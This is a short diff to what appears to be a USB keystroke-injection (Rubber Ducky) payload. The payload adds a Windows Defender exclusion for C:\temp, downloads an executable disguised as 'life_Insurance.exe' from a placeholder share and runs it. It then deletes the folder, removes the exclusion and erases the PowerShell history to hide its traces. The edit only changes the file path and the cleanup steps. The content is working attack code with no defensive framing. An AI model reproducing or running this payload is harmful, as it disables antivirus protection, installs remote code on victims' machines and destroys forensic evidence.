@@ -12,10 +12,10 @@ ALT y
 DELAY 3000
 STRING cd C:\ ; mkdir temp; Add-MpPreference -ExclusionPath "C:\temp"
 ENTER
-STRING $down = New-Object System.Net.WebClient; $url = '%SHARED_DRIVE%'; $file = 'life_Insurance.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);
+STRING $down = New-Object System.Net.WebClient; $url = '%SHARED_DRIVE%'; $file = 'C:\temp\life_Insurance.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);
 ENTER
-DELAY 1500
-STRING rm life_Insurance.exe ; cd ..
+DELAY 500
+STRING cd .. ; rm -r temp
 ENTER
 DELAY 500
 STRING Remove-MpPreference -ExclusionPath "C:\temp" ; rm -r temp ; Remove-Item (Get-PSreadlineOption).HistorySavePath
